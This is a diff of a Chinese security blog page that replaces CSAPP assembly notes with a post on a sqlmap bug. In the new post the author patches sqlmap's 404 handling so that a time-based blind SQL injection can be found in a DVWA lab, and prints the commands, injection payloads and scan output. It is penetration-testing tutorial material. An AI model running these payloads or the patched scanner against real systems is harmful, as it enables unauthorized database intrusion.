@@ -5,7 +5,7 @@
     <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no">
-<title>深入理解计算机系统第3章笔记</title>
+<title>sqlmap对状态码404处理的bug</title>
 <meta name="description" content="A blog about programming and network security">
 
 <link rel="profile" href="https://gmpg.org/xfn/11" />
@@ -93,19 +93,19 @@
     <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
       
 
-      <h1 class="header" itemprop="name">深入理解计算机系统第3章笔记</h1>
+      <h1 class="header" itemprop="name">sqlmap对状态码404处理的bug</h1>
 
       <div class="author">
         <small><i>
           
-          on <span itemprop="datePublished" content="2014-08-28">August 16, 2017</span>
-           under auxilary
+          on <span itemprop="datePublished" content="2014-08-28">August 20, 2017</span>
+           under web
         </i></small>
       </div>
 
       <div class="read-time">
         <small>
-          1 minute read
+          3 minute read
         </small>
       </div>
 
@@ -113,46 +113,134 @@
 
         
 
-        <span itemprop="articleBody"><p>1.编译器驱动程序将源文件翻译成可执行目标文件可分为4个阶段完成</p>
+        <span itemprop="articleBody"><h3 id="about">About</h3>
 
-<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-1.png" /></p>
+<p>sqlmap对页面遇到404响应码后直接抛出一个异常并退出sqlmap不再进行后续的paylaod测试,在用sqlmap测试sql注入点的时候,一
+般用到–batch参数来节省时间,这种情况下sqlmap有一处对http状态码404的处理不当导致无法测出注入点的bug</p>
 
-<p>a.<code class="highlighter-rouge">gcc -O1 -S hello.c</code>中:gcc也可用cc缩写代替,-O1表示编译器优化级别,-S表示生成汇编代码,结果为hello.s[汇编]
-b.<code class="highlighter-rouge">gcc -O1 -c hello.c</code>:gcc会编译并汇编,得到hello.o,hello.o是二进制格式,可用<code class="highlighter-rouge">objdump -d hello.o</code>查看汇编格式内容
-c.<code class="highlighter-rouge">gcc -O1 -o hello hello.o main.c</code>:可由gcc产生可执行文件hello,可用<code class="highlighter-rouge">objdump -d hello</code>反汇编hello这个可执行文件[反汇编]
-d.上面a中的汇编过程默认得到的为ATT格式的汇编代码,要得到intel格式的指令为:<code class="highlighter-rouge">gcc -O1 -S -masm=intel hello.c</code></p>
+<h3 id="detail">Detail</h3>
 
-<p>2.gcc生成的汇编指令都有一个字符后缀,表明操作数的大小,movb表示传送字节(eg,对应al/ah),movw表示传送字(eg,对应ax/bx),
-movl表示传送双字(eg,对应eax/ebx)</p>
+<p>在爬虫时get请求的url可轻易爬到,但是post请求的url及post的数据的取得需要探测html中有没有表单相关的关键字,并通过表单
+来构造post参数的值并提交来获取后续返回内容,如下例中详情:</p>
 
-<p>3.mov指令有个限制,传送指令的两个操作数不能都指向存储器位置.eg,mov [0x1000],[0x2000]是不允许的,需要mov eax,[0x1000]先,再mov [0x2000],eax</p>
+<p>安装dvwa设置level=low,测试<code class="highlighter-rouge">SQL Injection(Blind)</code>这一项时,参数是通过表单来提交的,点击<code class="highlighter-rouge">submit</code>提交后会将输入框<code class="highlighter-rouge">User
+ID</code>中的内容以get请求发送到服务器,例如在文本框中输入1则浏览器将对应访问<code class="highlighter-rouge">http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#</code></p>
 
-<p>4.movs和movz都是将一个较小的数据复制到一个较大的数据位置,高位用符号位扩展(movs)或者用零位扩展(movz)进行填充</p>
+<p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/sqlmap404bug-1.png" /></p>
 
-<p>5.movsbl:将b符号扩展(s)成l格式后再mov到l,movzwl:将w零扩展(z)成l后再mov到l,eg:假设%dh=CD(1100 1101),%eax=98765432</p>
+<p>尝试用sqlmap跑出这个注入点,语句如下:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>movb %dh,%al        %al=%dh=CD,%eax=987654CD
-movsbl %dh,%eax     sbl:%dh-&gt;FFFFCD,%eax=FFFFCD
-movzbl %dh,%eax     zbl:%dh-&gt;0000CD,%eax=0000CD
+<div class="highlighter-rouge"><pre class="highlight"><code>sqlmap -u "http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#" --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' 这样是可以跑出来的,但是要提高效率用工具自动发现这个漏洞时,一般这样用sqlmap:
+
+sqlmap -u "http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;Submit=Submit#" --forms -v 3 --cookie='...' 由于这里的id参数通过爬虫无法获得,因为这个id参数的值是通过表单提交的,爬虫最多可得到的url为:
+
+http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;Submit=Submit# 上图中的`Submit`按钮对应的应该是js处理的动作,js将表单通过get请求发送到服务器,这种情况下,需要用selenium+phantomjs 来获得上面的url(或者使用sqlmap中的--forms参数来捕获这样的表单),而就算得到了url,由于这个url中的`id=`,也即id值为空, 这种情况下,sqlmap的--batch参数的处理是随机赋值给id并测试各种payload(eg,id=1389),然而dvwa中的这个页面在服务器上的 处理并不一般,如果用户提交的id参数在服务器上没有查询到,服务器会响应404状态码(可能一般waf也会这样做),而sqlmap遇到 404状态码,直接就抛出异常并退出了,这样导致无法用sqlmap的--batch参数测出这个sql注入点
 </code></pre>
 </div>
 
-<p>6.左移右移汇编指令</p>
+<p>其实如果用selenium+phantomjs得到了url<code class="highlighter-rouge">http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;Submit=Submit#</code>后
+如果服务器正常响应查询(这里的dvwa不正常响应,对查不到的统一返回404状态码),用sqlmap是可以检测到这种不带具体值的参数
+类型url的注入点的,但是要设置–risk=3,默认的sqlmap的risk值为1,为1时sqlmap不会测试<code class="highlighter-rouge">' or [sqli] and '1'='1</code>(要测出不
+带参数值的参数的注入点则要通过or来测试),也即要发挥sqlmap的功能最好设置<code class="highlighter-rouge">--batch --risk=3 --forms</code>.试试直接用这种方
+法测试上面的注入点(在dvwa中对应的页面为<code class="highlighter-rouge">http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/</code>):</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>sal:算术左移
-shl:逻辑左移
-sar:算术右移
-shr:逻辑右移
-sal=shl,只有算术右移(sar)操作要求区分有符号和无符号操作数,shr在高位补0,sal和shl在低位补0,这个特性使得补码运算
-成为实现有符号整数运算的一种比较好的方法
+<div class="highlighter-rouge"><pre class="highlight"><code>/tmp/sqlmap [master] » python2 sqlmap.py -u "192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.1.8.6#dev}
+|_ -| . [(]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 14:40:30
+
+[14:40:30] [DEBUG] cleaning up configuration parameters
+[14:40:30] [DEBUG] setting the HTTP timeout
+[14:40:30] [DEBUG] setting the HTTP Cookie header
+[14:40:30] [DEBUG] creating HTTP requests opener object
+[14:40:30] [DEBUG] resolving hostname '192.168.8.190'
+[14:40:30] [INFO] testing connection to the target URL
+[14:40:30] [DEBUG] declared web page charset 'utf-8'
+[14:40:30] [INFO] searching for forms
+[14:40:30] [DEBUG] initializing the knowledge base
+[#1] form:
+GET http://192.168.8.190:80/dvwa/vulnerabilities/sqli_blind/?id=&amp;Submit=Submit
+Cookie: PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low
+do you want to test this form? [Y/n/q]
+&gt; Y
+[14:40:30] [DEBUG] used the default behaviour, running in batch mode
+Edit GET data [default: id=&amp;Submit=Submit]: id=&amp;Submit=Submit
+[14:40:30] [DEBUG] used the default behaviour, running in batch mode
+do you want to fill blank fields with random values? [Y/n] Y
+[14:40:30] [DEBUG] used the default behaviour, running in batch mode
+[14:40:30] [INFO] resuming back-end DBMS 'mysql'
+[14:40:30] [INFO] using '/var/root/.sqlmap/output/results-08202017_0240pm.csv' as the CSV results file in multiple targets mode
+[14:40:30] [DEBUG] resolving hostname '192.168.8.190'
+[14:40:30] [DEBUG] declared web page charset 'utf-8'
+[14:40:30] [CRITICAL] page not found (404)
+[14:40:30] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 1 times
+[14:40:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/var/root/.sqlmap/output/results-08202017_0240pm.csv'
+
+[*] shutting down at 14:40:30
 </code></pre>
 </div>
 
-<p>7.c/c++中的goto与汇编中的jmp addr等同,条件数据传送指令比条件控制转移的性能好</p>
+<p>发现sqlmap跑不出来,尝试修改sqlmap代码,结果中有关键字<code class="highlighter-rouge">page not found (404)</code>,于是定位相关代码:</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>条件数据传送,eg:
-cmp %edx,%ecx
-cmovl %ebx,%eax(此处的l代表less,不是att中的movl中的long)
+<div class="highlighter-rouge"><pre class="highlight"><code>cd /tmp/sqlmap &amp;&amp; grep -r "page not found" .
+</code></pre>
+</div>
+
+<p>结果如下:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>./lib/request/connect.py:                    errMsg = "page not found (%d)" % code
+./lib/request/connect.py:                    debugMsg = "page not found (%d)" % code
+./lib/utils/crawler.py:                    if "page not found" in getSafeExString(ex):
+</code></pre>
+</div>
+
+<p>于是修改./lib/request/connect.py中代码:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>elif ex.code == httplib.NOT_FOUND:
+    if raise404:
+        errMsg = "page not found (%d)" % code
+        raise SqlmapConnectionException(errMsg)
+    else:
+        debugMsg = "page not found (%d)" % code
+        singleTimeLogMessage(debugMsg, logging.DEBUG)
+</code></pre>
+</div>
+
+<p>将其中的raise SqlmapConnectionException(errMsg)注释掉后再重新用刚才的sqlmap语句测试可测出这个注入点,详情如下:</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>/tmp/sqlmap [master●] » python2 sqlmap.py -u "192.168.8.190/dvwa/vulnerabilities/sqli_blind/" --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
+[14:48:41] [DEBUG] checking for filtered characters
+[14:48:41] [PAYLOAD] OOFt' OR 6597=IF((3988&gt;3987),SLEEP(5),6597) AND 'sIjt'='sIjt
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[14:49:06] [DEBUG] used the default behaviour, running in batch mode
+sqlmap identified the following injection point(s) with a total of 146 HTTP(s) requests:
+    ---
+Parameter: id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 OR time-based blind
+    Payload: id=OOFt' OR SLEEP(5) AND 'CaKs'='CaKs&amp;Submit=Submit
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+    ---
+do you want to exploit this SQL injection? [Y/n] Y
+[14:49:06] [DEBUG] used the default behaviour, running in batch mode
+[14:49:06] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL &gt;= 5.0.12
+[14:49:06] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 131 times
+[14:49:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file
+'/var/root/.sqlmap/output/results-08202017_0246pm.csv'
+
+[*] shutting down at 14:49:06
 </code></pre>
 </div>
 </span>
@@ -164,7 +252,7 @@ cmovl %ebx,%eax(此处的l代表less,不是att中的movl中的long)
         <div class="tags">
           <small>
           <i class="fa fa-tags"></i>
-            csapp
+            sqlmap, python
           </small>
         </div>
         
